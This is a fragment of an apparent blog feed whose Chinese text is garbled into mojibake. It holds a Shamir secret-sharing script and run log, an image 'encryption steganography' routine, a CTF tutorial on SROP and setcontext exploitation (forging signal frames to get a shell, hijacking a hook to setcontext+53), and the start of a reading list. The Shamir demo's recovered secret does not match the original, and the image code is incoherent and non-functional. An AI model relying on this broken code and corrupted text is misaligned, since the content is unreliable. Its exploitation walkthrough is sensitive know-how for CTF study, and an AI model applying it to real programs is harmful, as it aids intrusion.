class="hljs-number">8</span><br>secret = <span class="hljs-number">31298123678</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before:&#x27;</span>,secret)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ENCRYPTING.......&#x27;</span>)<br><span class="hljs-comment">##æ„é€ å¤šé¡¹å¼f(x)</span><br>fx = [random.randrange(<span class="hljs-number">0</span>,<span class="hljs-built_in">max</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t-<span class="hljs-number">1</span>)]<br>fx.append(secret)<br><br><span class="hljs-comment">##ä»»å–nä¸ªxï¼Œåˆ†åˆ«å¸¦å…¥å¤šé¡¹å¼ï¼Œäº§ç”Ÿå¯¹åº”çš„(x,y)</span><br>share = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    x = random.randrange(<span class="hljs-number">1</span>,<span class="hljs-built_in">max</span>)<br>    y = <span class="hljs-number">0</span> <br>    <span class="hljs-keyword">for</span> idx, value <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(fx[::-<span class="hljs-number">1</span>]):<br>        y += value * x**idx<br>    share.append((x,y))         <span class="hljs-comment">##æ¯äººåˆ†åˆ°çš„(x,y)åºåˆ—</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;share:(&#x27;</span>,x,<span class="hljs-string">&#x27;,&#x27;</span>,y,<span class="hljs-string">&#x27;)&#x27;</span>)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;DECRYPTING......&#x27;</span>)<br><span class="hljs-comment">##ä»»å–tä¸ª(x,y)åºåˆ—,å¹¶è§£å¯†</span><br>key = random.sample(share,t)<br><span class="hljs-built_in">sum</span> =<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i, key_i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>    x_i,y_i = key_i<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;key:(&#x27;</span>,x_i,<span class="hljs-string">&#x27;,&#x27;</span>,y_i,<span class="hljs-string">&#x27;)&#x27;</span>)<br>    temp = Decimal(<span class="hljs-number">1</span>)<br>    <br>    <span class="hljs-keyword">for</span> j, key_j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>        x_j,y_j = key_j<br>        <span class="hljs-keyword">if</span> i != j:<br>            temp *= Decimal(Decimal(x_j)/Decimal(x_j-x_i))<br>    temp *= y_i<br>    <span class="hljs-built_in">sum</span> += Decimal(temp)<br><br><span class="hljs-built_in">sum</span> = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">round</span>(Decimal(<span class="hljs-built_in">sum</span>),<span class="hljs-number">0</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>,<span class="hljs-built_in">sum</span>)<br></code></pre></td></tr></table></figure><h4 id="è¿è¡Œç¤ºèŒƒ"><a href="#è¿è¡Œç¤ºèŒƒ" class="headerlink" title="è¿è¡Œç¤ºèŒƒ"></a>è¿è¡Œç¤ºèŒƒ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€[loorain@ubuntu] - [~/crypto/shamir] - [2304]shamir<br>â””â”€[$] python3 shamir.py                                                                                                                                                                                             [20:33:27]<br>before: 31298123678<br>ENCRYPTING.......<br>share:( 385490 , 19613871609040056923504678528 )<br>share:( 208439 , 1676593182288704748621405212 )<br>share:( 111980 , 139661059121519203627546778 )<br>share:( 287787 , 6092505271995476798344376612 )<br>share:( 57978 , 10036212148635231635583656 )<br>share:( 8027 , 3687858811716396682052 )<br>share:( 640969 , 149919642500298401999699916572 )<br>share:( 444105 , 34550423234050839227167648028 )<br>DECRYPTING......<br>key:( 444105 , 34550423234050839227167648028 )<br>key:( 111980 , 139661059121519203627546778 )<br>key:( 208439 , 1676593182288704748621405212 )<br>key:( 287787 , 6092505271995476798344376612 )<br>key:( 385490 , 19613871609040056923504678528 )<br>after: 31298123800<br></code></pre></td></tr></table></figure><h2 id="å›¾åƒåŠ å¯†éšå†™"><a href="#å›¾åƒåŠ å¯†éšå†™" class="headerlink" title="å›¾åƒåŠ å¯†éšå†™"></a>å›¾åƒåŠ å¯†éšå†™</h2><blockquote><p>è¿™é‡Œç”¨0-255çš„çŸ©é˜µæ¨¡æ‹Ÿç°åº¦å›¾åƒ</p></blockquote><h3 id="åŠ å¯†è¿‡ç¨‹-1"><a href="#åŠ å¯†è¿‡ç¨‹-1" class="headerlink" title="åŠ å¯†è¿‡ç¨‹"></a>åŠ å¯†è¿‡ç¨‹</h3><p><img src="/img/article/shamir/cry.png" alt="åŠ å¯†ç¤ºæ„å›¾"></p><p>éšæœºç”Ÿæˆ O å’Œ Sï¼Œå¹¶è®¡ç®— d å’Œ si</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">S_img = rd.randint(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>,(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>))<br>O_img = rd.randint(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>,(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>))<br>Q_img = rd.randint(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>))<br>m = number.getPrime(<span class="hljs-number">4</span>) <span class="hljs-comment">#éšæœºç”Ÿæˆä¸€ä¸ªç´ æ•°m</span><br><br>d = O_img % m<br>S_i = S_img % m<br></code></pre></td></tr></table></figure><p>ç”ŸæˆQ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">20</span>):<br>        Q_img[i,j] = math.floor(O_img[i,j] / m) * m<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆy &#x3D; f(x),æ±‚å¾—yä¸Qç›¸åŠ çš„åˆ°nä¸ªOi</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">O_i = []<br><span class="hljs-comment">##ç”Ÿæˆy = f(x),æ±‚å¾—yä¸Qç›¸åŠ çš„åˆ°nä¸ªOi</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">400</span>):<br>    key = random.randrange(<span class="hljs-number">1</span>,<span class="hljs-built_in">max</span>)<br>    y = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            y += S_i[i,j]* (key ** (i*<span class="hljs-number">10</span>+j))<br>    y += d[n] * (key ** (i*<span class="hljs-number">10</span>+j))<br>    O_i.append((Q_img + y)) <br></code></pre></td></tr></table></figure><h3 id="è§£å¯†è¿‡ç¨‹-1"><a href="#è§£å¯†è¿‡ç¨‹-1" class="headerlink" title="è§£å¯†è¿‡ç¨‹"></a>è§£å¯†è¿‡ç¨‹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    Q_img.append((O_i[i, <span class="hljs-number">0</span>] // m) * m)<br>    so1.append(d[i] - (O_i[i, <span class="hljs-number">0</span>] // m) * m)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    d.append(Q_img[i])<br>sol = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    d1 = np(<span class="hljs-number">0</span>,m,(<span class="hljs-number">10</span>, <span class="hljs-number">10</span>)) <br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            d1[j, k] = S_img[i, j]**k<br>    sol.append(d1.solve_right(O_img[i])[<span class="hljs-number">0</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    <span class="hljs-keyword">assert</span> sol[i]&gt;m<br>solve = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    solve.append(so1[i]+Q_img[i])<br><span class="hljs-built_in">print</span>(solve == d)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>setcontext &amp; SROP</title>
    <link href="/2022/06/05/srop/"/>
    <url>/2022/06/05/srop/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>SROP(Sigreturn Oriented Programming) äº 2014 å¹´è¢« Vrije Universiteit Amsterdam çš„ Erik Bosman æå‡ºï¼Œå…¶ç›¸å…³ç ”ç©¶<strong>Framing Signals â€” A Return to Portable Shellcode</strong> å…¶ä¸­ç›¸å…³çš„ paper ä»¥åŠå¦‚ä¸‹ï¼š<br><a href="https://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf">paper</a></p></blockquote><h2 id="æœºåˆ¶è¯¦è§£"><a href="#æœºåˆ¶è¯¦è§£" class="headerlink" title="æœºåˆ¶è¯¦è§£"></a>æœºåˆ¶è¯¦è§£</h2><p>signal æœºåˆ¶æ˜¯ç±» unix ç³»ç»Ÿä¸­è¿›ç¨‹ä¹‹é—´ç›¸äº’ä¼ é€’ä¿¡æ¯çš„ä¸€ç§æ–¹æ³•ã€‚ä¸€èˆ¬ï¼Œæˆ‘ä»¬ä¹Ÿç§°å…¶ä¸ºè½¯ä¸­æ–­ä¿¡å·ï¼Œæˆ–è€…è½¯ä¸­æ–­ã€‚æ¯”å¦‚è¯´ï¼Œè¿›ç¨‹ä¹‹é—´å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨ kill æ¥å‘é€è½¯ä¸­æ–­ä¿¡å·ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¿¡å·æœºåˆ¶å¸¸è§çš„æ­¥éª¤å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/img/article/srop/srop1.png" alt="Untitled"></p><ol><li>å†…æ ¸å‘æŸä¸ªè¿›ç¨‹å‘é€ signal æœºåˆ¶ï¼Œè¯¥è¿›ç¨‹ä¼šè¢«æš‚æ—¶æŒ‚èµ·ï¼Œè¿›å…¥å†…æ ¸æ€ã€‚</li><li>å†…æ ¸ä¼šä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œ<strong>ä¸»è¦æ˜¯å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥ signal ä¿¡æ¯ï¼Œä»¥åŠæŒ‡å‘ <code>sigreturn</code> çš„ç³»ç»Ÿè°ƒç”¨åœ°å€</strong>ã€‚æ­¤æ—¶æ ˆçš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ç§° <code>ucontext</code> ä»¥åŠ <code>siginfo</code> è¿™ä¸€æ®µä¸º <strong>Signal Frame</strong>ã€‚<strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„ã€‚</strong>ä¹‹åä¼šè·³è½¬åˆ°æ³¨å†Œè¿‡çš„ signal handler ä¸­å¤„ç†ç›¸åº”çš„ signalã€‚å› æ­¤ï¼Œå½“ signal handler æ‰§è¡Œå®Œä¹‹åï¼Œå°±ä¼šæ‰§è¡Œ <code>sigreturn</code> ä»£ç ã€‚</li><li><code>signal handler</code> è¿”å›åï¼Œå†…æ ¸ä¸ºæ‰§è¡Œ <code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…æ‹¬å°†æ‰€æœ‰å‹å…¥çš„å¯„å­˜å™¨ï¼Œé‡æ–° pop å›å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚å…¶ä¸­ï¼Œ32 ä½çš„ <code>sigreturn</code> çš„è°ƒç”¨å·ä¸º 77ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15ã€‚</li></ol><p><img src="/img/article/srop/srop2.png" alt="Untitled"></p><p>ä¸Šè¿°è°ˆåˆ°çš„ä»æ ˆä¸­POPå‡ºå¯„å­˜å™¨å†…å®¹çš„è¿‡ç¨‹ç”± <code>setcontext</code> å‡½æ•°å®ç°ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/img/article/srop/srop3.png" alt="Untitled"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä»æŒ‡ä»¤<code>mov rsp, [rdi+0A0h]</code>å¼€å§‹ï¼Œä¾¿æ˜¯ä¸€è¿ä¸²å¯¹äºå¯„å­˜å™¨çš„æ¢å¤æ“ä½œã€‚è€Œä¸”ç»“æ„ç”±Signal Frameç»“æ„ä½“å®ç°ï¼Œä»¥ä¸‹æ˜¯ç»“æ„æºç </p><p><strong>X86</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs, __gsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs, __fsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> es, __esh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ds, __dsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ecx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eax;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trapno;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> err;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eip;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs, __csh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp_at_signal;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ss, __ssh;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> oldmask;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cr2;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>X64</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span><br>  <span class="hljs-type">__uint16_t</span>        cwd;<br>  <span class="hljs-type">__uint16_t</span>        swd;<br>  <span class="hljs-type">__uint16_t</span>        ftw;<br>  <span class="hljs-type">__uint16_t</span>        fop;<br>  <span class="hljs-type">__uint64_t</span>        rip;<br>  <span class="hljs-type">__uint64_t</span>        rdp;<br>  <span class="hljs-type">__uint32_t</span>        mxcsr;<br>  <span class="hljs-type">__uint32_t</span>        mxcr_mask;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpxreg</span>    _<span class="hljs-title">st</span>[8];</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">xmmreg</span>    _<span class="hljs-title">xmm</span>[16];</span><br>  <span class="hljs-type">__uint32_t</span>        padding[<span class="hljs-number">24</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">__uint64_t</span> r8;<br>  <span class="hljs-type">__uint64_t</span> r9;<br>  <span class="hljs-type">__uint64_t</span> r10;<br>  <span class="hljs-type">__uint64_t</span> r11;<br>  <span class="hljs-type">__uint64_t</span> r12;<br>  <span class="hljs-type">__uint64_t</span> r13;<br>  <span class="hljs-type">__uint64_t</span> r14;<br>  <span class="hljs-type">__uint64_t</span> r15;<br>  <span class="hljs-type">__uint64_t</span> rdi;<br>  <span class="hljs-type">__uint64_t</span> rsi;<br>  <span class="hljs-type">__uint64_t</span> rbp;<br>  <span class="hljs-type">__uint64_t</span> rbx;<br>  <span class="hljs-type">__uint64_t</span> rdx;<br>  <span class="hljs-type">__uint64_t</span> rax;<br>  <span class="hljs-type">__uint64_t</span> rcx;<br>  <span class="hljs-type">__uint64_t</span> rsp;<br>  <span class="hljs-type">__uint64_t</span> rip;<br>  <span class="hljs-type">__uint64_t</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> __pad0;<br>  <span class="hljs-type">__uint64_t</span> err;<br>  <span class="hljs-type">__uint64_t</span> trapno;<br>  <span class="hljs-type">__uint64_t</span> oldmask;<br>  <span class="hljs-type">__uint64_t</span> cr2;<br>  __extension__ <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>      <span class="hljs-type">__uint64_t</span> __fpstate_word;<br>    &#125;;<br>  <span class="hljs-type">__uint64_t</span> __reserved1 [<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h2><h3 id="ç›´æ¥getshell"><a href="#ç›´æ¥getshell" class="headerlink" title="ç›´æ¥getshell"></a>ç›´æ¥getshell</h3><p><strong>ç¤ºæ„å›¾</strong></p><p><img src="/img/article/srop/srop4.png" alt="Untitled"></p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨æ ˆä¸Šä¼ªé€ Signal Frameï¼Œåˆ©ç”¨syscall(0xF)æ¥è§¦å‘å¯¹äºä¼ªé€ å¯„å­˜å™¨çš„æ¢å¤ï¼Œåœ¨<code>setcontext</code> æ‰§è¡Œå®Œæ¯•åï¼Œä¾¿ä¼šgetshellï¼ˆæˆ–åˆ©ç”¨æ ˆè½¬ç§»åˆ°å…¶ä»–åœ°å€ä¹Ÿå¯ä»¥ï¼Œä½†æ— è®ºæ€æ ·éƒ½è¦ä¿è¯åœ¨syscallæ—¶ï¼Œrspéœ€æŒ‡å‘Fake Frame çš„å¼€å¤´)</p><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>åœ¨ä¸Šé¢ç›´æ¥getshellçš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥è‡ªç„¶çš„æƒ³åˆ°ï¼Œé€šè¿‡ä¸æ–­ä¼ªé€ sigframeå¯ä»¥å®ç°ç±»ä¼¼ROPçš„æ•ˆæœï¼Œåªéœ€è¦å°†å…¶ä¸­rspæ§åˆ¶åˆ°ä¸‹ä¸€ä¸ªfakeframeçš„å¼€å¤´,ripåŠ ä¸Šretå³å¯ã€‚</p><p><strong>ç¤ºæ„å›¾</strong></p><p><img src="/img/article/srop/srop5.png" alt="Untitled"></p><h3 id="æ ˆè½¬ç§»"><a href="#æ ˆè½¬ç§»" class="headerlink" title="æ ˆè½¬ç§»"></a>æ ˆè½¬ç§»</h3><p>ç”±äºå…¶å¯ä»¥è½»æ˜“çš„æ§åˆ¶å‡ ä¹æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ï¼Œæ ˆè½¬ç§»è¿™æ ·çš„æ“ä½œä¹Ÿå¯ä»¥è½»æ¾å®ç°</p><h3 id="å †ä¸­ç›´æ¥åˆ©ç”¨setcontext"><a href="#å †ä¸­ç›´æ¥åˆ©ç”¨setcontext" class="headerlink" title="å †ä¸­ç›´æ¥åˆ©ç”¨setcontext"></a>å †ä¸­ç›´æ¥åˆ©ç”¨setcontext</h3><p>åœ¨é¢å¯¹å †é¢˜ç›®æ—¶ï¼Œæˆ‘ä»¬å¾ˆéš¾ç›´æ¥åœ¨æ ˆä¸Šæ„é€ å†…å®¹å¹¶ä¸”æ§åˆ¶rspæŒ‡å‘frameå¼€å¤´ã€‚æ­¤æ—¶å¯ä»¥ç›´æ¥é€šè¿‡åŠ«æŒhookä¸º<code>setcontext+53</code> å¤„(<strong>mov rsp, [rdi+0A0h]</strong>)ï¼Œç›´æ¥è§¦å‘å¯¹äºå¯„å­˜å™¨çš„ä¸€ç³»åˆ—popæ“ä½œã€‚ä¸”ç”±äºfreeæ—¶ï¼ŒripæŒ‡å‘chunkçš„memåŸŸï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨å°†è¦freeçš„chunké‡Œå†™ä¸ŠFake Frameï¼Œå¹¶åˆç†æ§åˆ¶ä¸ripçš„è·ç¦»å³å¯ã€‚</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>å¹³å°é¢˜ç›®SROPã€ ciscn 2021 silverwolf</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æˆ‘çš„å¿…è¯»ä¹¦ç›®è¡¨(ä»åœ¨æ›´æ–°)</title>
    <link href="/2022/06/05/%E3%80%8A%E6%A0%BC%E8%B0%83%EF%BC%9A%E7%A4%BE%E4%BC%9A%E7%AD%89%E7%BA%A7%E4%B8%8E%E7%94%9F%E6%B4%BB%E5%93%81%E5%91%B3%E3%80%8B/"/>
    <url>/2022/06/05/%E3%80%8A%E6%A0%BC%E8%B0%83%EF%BC%9A%E7%A4%BE%E4%BC%9A%E7%AD%89%E7%BA%A7%E4%B8%8E%E7%94%9F%E6%B4%BB%E5%93%81%E5%91%B3%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="ã€Šæ ¼è°ƒï¼šç¤¾ä¼šç­‰çº§ä¸ç”Ÿæ´»å“å‘³ã€‹"><a href="#ã€Šæ ¼è°ƒï¼šç¤¾ä¼šç­‰çº§ä¸ç”Ÿæ´»å“å‘³ã€‹" class="headerlink" title="ã€Šæ ¼è°ƒï¼šç¤¾ä¼šç­‰çº§ä¸ç”Ÿæ´»å“å‘³ã€‹"></a>ã€Šæ ¼è°ƒï¼šç¤¾ä¼šç­‰çº§ä¸ç”Ÿæ´»å“å‘³ã€‹</h2><blockquote><p>ä¸Šä¸–çºªæœ«æœŸç¾å›½ç¤¾ä¼šç»“æ„ï¼Œå¯¹äºç°åœ¨çš„æˆ‘ä»¬ä»æœ‰è®¸å¤šè­¦é†’ä¹‹å¤„ã€‚</p></blockquote><hr><h2 id="ã€ŠåŠ é€Ÿã€‹"><a href="#ã€ŠåŠ é€Ÿã€‹" class="headerlink" title="ã€ŠåŠ é€Ÿã€‹"></a>ã€ŠåŠ é€Ÿã€‹</h2><blockquote><p>æœ¬ä¹¦è®²è§£äº†ç°ä»£ç¤¾ä¼šä¸­æ—¶é—´ç»“æ„çš„æ”¹å˜ï¼Œæ·±å…¥çš„æ­ç¤ºäº†ç°ä»£ç¤¾ä¼šä¸­è®¸å¤šç°è±¡çš„æœ¬è´¨åŸå› ã€‚</p></blockquote><hr><h2 id="ã€Šæ–°å¼‚åŒ–çš„è¯ç”Ÿã€‹"><a href="#ã€Šæ–°å¼‚åŒ–çš„è¯ç”Ÿã€‹" class="headerlink" title="ã€Šæ–°å¼‚åŒ–çš„è¯ç”Ÿã€‹"></a>ã€Šæ–°å¼‚åŒ–çš„è¯ç”Ÿã€‹</h2><blockquote><p>ç¤¾ä¼šåŠ é€Ÿæ‰¹åˆ¤ç†è®ºå¤§çº²ï¼Œè¾©è¯çš„æ€è€ƒå½“ä»£äººä»¬çš„ç”Ÿæ´»ã€‚</p></blockquote><hr><h2 id="ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹"><a href="#ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹" class="headerlink" title="ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹"></a>ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹</h2><blockquote><p>è®¡ç®—æœºåº•å±‚åŸç†,å­¦è®¡ç®—æœºä¸è¯»CSAPPï¼Œç­‰äºæ²¡å­¦ï¼ˆdogeï¼‰ã€‚</p></blockquote><hr><h2 id="ã€ŠC-åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯æ­ç§˜ã€‹"><a 